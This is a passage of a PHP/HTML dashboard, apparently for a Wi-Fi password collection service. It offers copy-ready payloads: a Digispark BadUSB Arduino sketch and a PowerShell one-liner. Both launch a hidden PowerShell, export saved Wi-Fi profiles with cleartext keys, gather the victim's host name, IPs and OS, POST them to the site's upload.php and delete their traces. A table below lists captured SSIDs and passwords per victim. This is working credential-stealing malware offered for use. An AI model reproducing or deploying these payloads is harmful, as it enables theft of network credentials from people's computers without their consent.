        $cleanScript = "\$t='" . addslashes($currentUser) . "';\$u='{$proto}://{$host}/upload.php?token='+\$t;(netsh wlan show profiles)|Select-String ':(.+)\$'|ForEach-Object { \$s=\$_.Matches.Groups[1].Value.Trim(); \$k=((netsh wlan show profile name=\"\$s\" key=clear)|Select-String 'Key Content\\s*:\\s*(.+)\$').Matches.Groups[1].Value; if(-not \$k){\$k='(Not Found)'}; \$ip=(Get-NetIPAddress -AddressFamily IPv4 -ErrorAction SilentlyContinue|Where-Object {\$_.IPAddress -notlike '127.*' -and \$_.IPAddress -notlike '169.254.*'}|Select-Object -ExpandProperty IPAddress -First 1); if(-not \$ip){\$ip='offline'}; \$b=\"\$(Get-Date -f 'yyyy-MM-dd HH:mm:ss'),\$env:COMPUTERNAME,\$s,\$k,\$ip,\$((Get-CimInstance Win32_OperatingSystem).Caption)\"; try{Invoke-RestMethod -Uri \$u -Method POST -Body \$b -TimeoutSec 5}catch{} }";
        $b64Enc = base64_encode(mb_convert_encoding($cleanScript, 'UTF-16LE', 'UTF-8'));
      ?>

      <div style="margin-bottom:18px;">
        <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:6px;">
          <span style="font-size:12px;font-weight:700;color:#64748b;text-transform:uppercase;">1. Digispark (Original Arduino .ino Code)</span>
          <button type="button" onclick="copyCode('digiCode')" style="background:rgba(255,255,255,0.06);border:1px solid rgba(255,255,255,0.1);color:#38bdf8;padding:4px 10px;border-radius:6px;font-size:11px;font-weight:600;cursor:pointer;">📋 Copy Arduino Code</button>
        </div>
        <pre id="digiCode" style="font-family:'JetBrains Mono',monospace;font-size:12px;background:#020617;border:1px solid rgba(255,255,255,0.08);border-radius:10px;padding:14px;color:#cbd5e1;overflow-x:auto;white-space:pre-wrap;">#include "DigiKeyboard.h"

#define KEY_R 0x15

void setup() {
  pinMode(1, OUTPUT); // onboard LED
}

void loop() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(2000);

  // Open Run dialog
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(600);

  // Launch PowerShell (hidden)
  DigiKeyboard.println("powershell -w hidden -NoLogo -NoProfile -ExecutionPolicy Bypass");
  DigiKeyboard.delay(1800);

  // Wi-Fi grab + victim ID + LAN IP + location + CSV + POST + cleanup + exit
  DigiKeyboard.print(
    F(
      "$u='<?php echo $proto . '://' . $host; ?>/upload.php?token=<?php echo urlencode($currentUser); ?>';"
      "$t=$env:TEMP;"
      "netsh wlan export profile folder=\"$t\" key=clear > $null;"
      "$os=(Get-CimInstance Win32_OperatingSystem).Caption;"
      "$victimId=$env:COMPUTERNAME;"
      "try{$pub=(Invoke-WebRequest -UseBasicParsing 'https://api.ipify.org' -TimeoutSec 3).Content.Trim()}catch{$pub='(unknown)'};"
      "$defaultRoute=Get-NetRoute -DestinationPrefix '0.0.0.0/0' -ErrorAction SilentlyContinue|Sort-Object RouteMetric|Select-Object -First 1;"
      "if($defaultRoute){$ifIndex=$defaultRoute.InterfaceIndex;$lanObj=Get-NetIPAddress -AddressFamily IPv4 -InterfaceIndex $ifIndex -ErrorAction SilentlyContinue|Where-Object{ $_.IPAddress -notlike '169.254*' -and $_.IPAddress -notlike '127.0.0.1'}|Select-Object -First 1}else{$lanObj=$null};"
      "if($lanObj){$lan=$lanObj.IPAddress}else{$lan='(unknown)'};"
      "$alt='N/A';$lat='N/A';$lon='N/A';"
      "$ts=(Get-Date -f 'yyyy-MM-dd HH:mm:ss');"
      "$items=@();"
      "Get-ChildItem \"$t\\Wi-Fi-*.xml\"|ForEach-Object{"
        "$x=[xml](Get-Content $_.FullName);"
        "$s=$x.WLANProfile.SSIDConfig.SSID.name;"
        "$p=$x.WLANProfile.MSM.security.sharedKey.keyMaterial;"
        "$items+=[pscustomobject]@{"
          "Time=$ts;"
          "VictimID=$victimId;"
          "SSID=$s;"
          "Password=if($p){$p}else{''};"
          "VictimLANIP=$lan;"
          "VictimOS=$os;"
          "PublicIP=$pub;"
          "LANExtra=$alt;"
          "Latitude=$lat;"
          "Longitude=$lon;"
          "PacketSummary=''"
        "};"
        "Remove-Item $_.FullName -ErrorAction SilentlyContinue"
      "};"
      "if($items){"
        "$csv=\"$t\\w.csv\";"
        "$items|Export-Csv $csv -NoTypeInformation;"
        "Invoke-WebRequest -UseBasicParsing -Uri $u -Method Post -Body (Get-Content $csv -Raw);"
        "Remove-Item $csv -ErrorAction SilentlyContinue;"
      "};"
      "exit;"
    )
  );
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(3000);

  // Blink LED to confirm completion
  while (true) {
    digitalWrite(1, HIGH);
    DigiKeyboard.delay(200);
    digitalWrite(1, LOW);
    DigiKeyboard.delay(200);
  }
}</pre>
      </div>

      <div style="margin-bottom:18px;">
        <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:6px;">
          <span style="font-size:12px;font-weight:700;color:#64748b;text-transform:uppercase;">2. Direct PowerShell Command (Paste into PowerShell)</span>
          <button type="button" onclick="copyCode('psOneLiner')" style="background:rgba(255,255,255,0.06);border:1px solid rgba(255,255,255,0.1);color:#38bdf8;padding:4px 10px;border-radius:6px;font-size:11px;font-weight:600;cursor:pointer;">📋 Copy Command</button>
        </div>
        <pre id="psOneLiner" style="font-family:'JetBrains Mono',monospace;font-size:12px;background:#020617;border:1px solid rgba(255,255,255,0.08);border-radius:10px;padding:12px;color:#38bdf8;overflow-x:auto;white-space:pre-wrap;">&amp; { $u='<?php echo $proto . '://' . $host; ?>/upload.php?token=<?php echo urlencode($currentUser); ?>'; $t=$env:TEMP; netsh wlan export profile folder="$t" key=clear > $null; $os=(Get-CimInstance Win32_OperatingSystem).Caption; $victimId=$env:COMPUTERNAME; try{$pub=(Invoke-WebRequest -UseBasicParsing 'https://api.ipify.org' -TimeoutSec 3).Content.Trim()}catch{$pub='(unknown)'}; $defaultRoute=Get-NetRoute -DestinationPrefix '0.0.0.0/0' -ErrorAction SilentlyContinue|Sort-Object RouteMetric|Select-Object -First 1; if($defaultRoute){$ifIndex=$defaultRoute.InterfaceIndex;$lanObj=Get-NetIPAddress -AddressFamily IPv4 -InterfaceIndex $ifIndex -ErrorAction SilentlyContinue|Where-Object{ $_.IPAddress -notlike '169.254*' -and $_.IPAddress -notlike '127.0.0.1'}|Select-Object -First 1}else{$lanObj=$null}; if($lanObj){$lan=$lanObj.IPAddress}else{$lan='(unknown)'}; $ts=(Get-Date -f 'yyyy-MM-dd HH:mm:ss'); $items=@(); Get-ChildItem "$t\Wi-Fi-*.xml"|ForEach-Object{ $x=[xml](Get-Content $_.FullName); $s=$x.WLANProfile.SSIDConfig.SSID.name; $p=$x.WLANProfile.MSM.security.sharedKey.keyMaterial; $items+=[pscustomobject]@{ Time=$ts; VictimID=$victimId; SSID=$s; Password=if($p){$p}else{''}; VictimLANIP=$lan; VictimOS=$os; PublicIP=$pub; LANExtra='N/A'; Latitude='N/A'; Longitude='N/A'; PacketSummary='' }; Remove-Item $_.FullName -ErrorAction SilentlyContinue }; if($items){ $csv="$t\w.csv"; $items|Export-Csv $csv -NoTypeInformation; Invoke-WebRequest -UseBasicParsing -Uri $u -Method Post -Body (Get-Content $csv -Raw); Remove-Item $csv -ErrorAction SilentlyContinue }; exit }</pre>
      </div>

      <div style="display:flex;justify-content:flex-end;">
        <button type="button" onclick="closePayloadModal()" style="padding:10px 18px;border-radius:8px;border:none;background:rgba(255,255,255,0.08);color:#fff;font-family:inherit;font-size:13px;font-weight:600;cursor:pointer;">Close</button>
      </div>
    </div>
  </div>

  <script>
  function openPayloadModal() {
    document.getElementById('payloadModal').style.display = 'flex';
  }
  function closePayloadModal() {
    document.getElementById('payloadModal').style.display = 'none';
  }
  function copyCode(id) {
    const text = document.getElementById(id).innerText;
    navigator.clipboard.writeText(text).then(() => {
      alert('Copied to clipboard!');
    });
  }
  </script>

  <div class="stats-row">
    <div class="card-stat stat-indigo">
      <div class="stat-label">Total Captured</div>
      <div class="stat-value"><?php echo $totalCaptures; ?></div>
    </div>
    <div class="card-stat stat-rose">
      <div class="stat-label">Weak Passwords</div>
      <div class="stat-value" style="color:#f43f5e"><?php echo $weakCount; ?></div>
    </div>
    <div class="card-stat stat-emerald">
      <div class="stat-label">Unique Networks</div>
      <div class="stat-value" style="color:#10b981"><?php echo $uniqueSSIDs; ?></div>
    </div>
  </div>

  <div class="table-box">
    <div class="table-header">
      <h2>Captured Wi-Fi Profiles</h2>
    </div>
    <?php if (empty($deduped)): ?>
      <div class="empty-state">No credentials collected yet. Run the collector script to test.</div>
    <?php else: ?>
    <div style="overflow-x:auto">
      <table>
        <thead>
          <tr>
            <?php if ($isAdmin): ?><th>Captured By</th><?php endif; ?>
            <th>Timestamp</th>
            <th>Network SSID</th>
            <th>Password</th>
            <th>Strength</th>
            <th>LAN IP</th>
            <th>Public IP</th>
            <th>Target OS</th>
            <th>Coordinates</th>
          </tr>
        </thead>
        <tbody>
          <?php foreach ($deduped as $cap): ?>
          <tr>
            <?php if ($isAdmin): ?>
              <td><span class="owner-pill"><?php echo h($cap['_owner']); ?></span></td>
            <?php endif; ?>
            <td style="color:#94a3b8"><?php echo h($cap['time']); ?></td>
            <td><strong style="color:#fff"><?php echo h($cap['ssid']); ?></strong></td>
            <td><span class="code-pill"><?php echo h($cap['password']); ?></span></td>
            <td>
              <?php if ($cap['password'] === '(Not Found)'): ?>
                <span class="badge" style="background:rgba(255,255,255,0.06);color:#94a3b8">N/A</span>
              <?php elseif ($cap['weak']): ?>
                <span class="badge badge-weak">Weak</span>
              <?php else: ?>
                <span class="badge badge-strong">Strong</span>
              <?php endif; ?>
            </td>
            <td><span style="font-family:'JetBrains Mono',monospace;font-size:12px;color:#94a3b8"><?php echo h($cap['ip_main']); ?></span></td>
            <td><span style="font-family:'JetBrains Mono',monospace;font-size:12px;color:#38bdf8"><?php echo h($cap['public_ip'] ?? 'unknown'); ?></span></td>
            <td><?php echo h($cap['os']); ?></td>
            <td>
              <?php if ($cap['latitude'] !== 'N/A' && $cap['longitude'] !== 'N/A'): ?>
                <a href="https://maps.google.com/?q=<?php echo h($cap['latitude'].','.$cap['longitude']); ?>" target="_blank" style="color:#6366f1;text-decoration:none;font-weight:600">View Map</a>
              <?php else: echo '<span style="color:#475569">N/A</span>'; endif; ?>
            </td>
          </tr>
          <?php endforeach; ?>
        </tbody>
      </table>
    </div>
    <?php endif; ?>
  </div>
</main>

</body>
</html>
